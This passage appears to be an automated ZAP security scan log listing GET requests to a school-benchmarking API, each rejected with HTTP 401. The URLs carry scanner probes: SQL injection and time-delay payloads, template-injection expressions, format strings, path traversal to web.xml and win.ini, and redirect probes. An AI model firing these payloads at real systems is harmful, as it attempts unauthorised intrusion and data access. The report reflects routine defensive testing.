  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+or+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+OR+1%253D1+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+UNION+ALL+select+NULL+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set0W45pz4p&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=get-help&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252F%255C1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252F1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252Fwww.google.com%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252Fwww.google.com%253A80%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=http%253A%252F%252Fwww.google.com&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=https%253A%252F%252F%255C1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=https%253A%252F%252F1498374535918995670.owasp.org&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=response.write%2528269%252C797*27%252C642%2529&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=thishouldnotexistandhopefullyitwillnot&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=type+%2525SYSTEMROOT%2525%255Cwin.ini&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=user-data&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=WEB-INF%252Fweb.xml&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=WEB-INF%255Cweb.xml&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=www.google.com%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=www.google.com%252Fsearch%253Fq%253DZAP&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=www.google.com%253A80%252F&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=www.google.com%253A80%252Fsearch%253Fq%253DZAP&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=www.google.com&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=ZAP&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zApPX66sS&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%2523%257B3310*7815%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%2523set%2528%2524x%253D9883*3430%2529%2524%257Bx%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%2524%257B7148*2381%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%253C%2525%253D8103*2430%2525%253Ezj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%253Cp+th%253Atext%253D%2522%2524%257B5291*4383%257D%2522%253E%253C%252Fp%253Ezj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%25234799*7033%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%25404488*8475%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%2540math+key%253D%25225318%2522+method%253D%2522multiply%2522+operand%253D%25223458%2522%252F%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%257B%253D6106*6111%257D%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%257B2217*3639%257D%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%257B64650%257Cadd%253A20490%257D%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B%257Bprint+%25221265%2522+%25226021%2522%257D%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj%257B8549*8905%257Dzj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=zj+9684*2870+zj&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+%252F+sleep%252815%2529+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+and+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+AND+1%253D1+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+AND+1%253D2+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+or+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+OR+1%253D1+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+UNION+ALL+select+NULL+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId+where+0+in+%2528select+sleep%252815%2529+%2529+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId0W45pz4p&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=WEB-INF%252Fweb.xml&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=WEB-INF%255Cweb.xml&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=www.google.com%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=www.google.com%252Fsearch%253Fq%253DZAP&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=www.google.com%253A80%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=www.google.com%253A80%252Fsearch%253Fq%253DZAP&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=www.google.com&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=ZAP&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zApPX64sS&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%2523%257B2369*5103%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%2523set%2528%2524x%253D6124*1918%2529%2524%257Bx%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%2524%257B7239*8276%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%253C%2525%253D4930*5968%2525%253Ezj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%253Cp+th%253Atext%253D%2522%2524%257B6159*3632%257D%2522%253E%253C%252Fp%253Ezj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%25231820*1426%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%25405818*5138%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%2540math+key%253D%25225508%2522+method%253D%2522multiply%2522+operand%253D%25224782%2522%252F%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%257B%253D4823*3383%257D%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%257B2025*1628%257D%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
